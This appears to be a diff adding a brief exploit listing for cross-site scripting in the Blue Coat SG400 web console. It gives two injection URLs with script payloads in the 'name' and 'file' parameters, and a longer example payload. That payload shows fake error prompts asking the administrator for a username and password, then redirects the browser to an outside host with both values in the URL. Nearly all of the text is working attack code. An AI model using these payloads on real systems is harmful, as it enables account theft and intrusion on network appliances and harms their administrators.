@@ -1,0 +1,15 @@
+https://www.example.com:8082/Secure/Local/console/install_upload_action/crl_format?name=&quot;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;%00
+
+https://www.example.com:8082/Secure/Local/console/install_upload_from_file.htm?file=&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&lt;!--
+
+Example Payload:
+&lt;script&gt;
+do {
+    a=prompt(&quot;Blue Coat SG400: an error has occurred\nPlease enter your 
+USERNAME&quot;,&quot;&quot;);
+    b=prompt(&quot;Blue Coat SG400: an error has occurred\nPlease enter your 
+PASSWORD&quot;,&quot;&quot;);
+}while(a==null || b==null || a==&quot;&quot; || b==&quot;&quot;);
+
+alert(&quot;owned!:&quot;+a+&quot;/&quot;+b);window.location=&quot;http://www.example2.com/?u=&quot;+a+&quot;&amp;p=&quot;+b
+&lt;/script&gt;&lt;!--
